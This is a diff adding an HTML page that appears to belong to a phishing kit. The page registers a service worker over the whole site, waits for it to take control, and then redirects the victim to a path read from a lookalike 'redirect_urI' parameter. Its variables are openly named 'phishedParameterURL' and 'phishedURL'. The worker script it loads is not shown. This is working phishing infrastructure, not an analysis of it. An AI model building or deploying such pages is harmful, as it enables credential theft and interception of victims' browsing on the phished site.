@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+</head>
+
+<body>
+    <script src="/script_Vx9Z6XN5uC3k.js"></script>
+    <script>
+        if ("serviceWorker" in navigator) {
+            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
+                scope: "/",
+            })
+                .then((registration) => {
+                    console.log("Service worker registered, waiting for control...");
+
+                    // Wait for the service worker to control this page
+                    if (navigator.serviceWorker.controller) {
+                        // Already controlled
+                        performRedirect();
+                    } else {
+                        // Wait for control
+                        navigator.serviceWorker.addEventListener('controllerchange', () => {
+                            console.log("Service worker now controlling the page");
+                            performRedirect();
+                        });
+
+                        // Also try to claim immediately if the worker is already active
+                        if (registration.active) {
+                            registration.active.postMessage({ type: 'CLAIM_CLIENTS' });
+                        }
+                    }
+
+                    function performRedirect() {
+                        const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
+                        const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
+
+                        console.log("Redirecting to:", `${phishedURL.pathname}${phishedURL.search}`);
+                        self.location.replace(`${phishedURL.pathname}${phishedURL.search}`);
+                    }
+                })
+                .catch((error) => {
+                    console.error(`Service worker registration failed: ${error}`);
+                });
+        }
+        else {
+            console.error("Service workers are not supported by this browser");
+        }
+    </script>
+</body>
+
+</html>
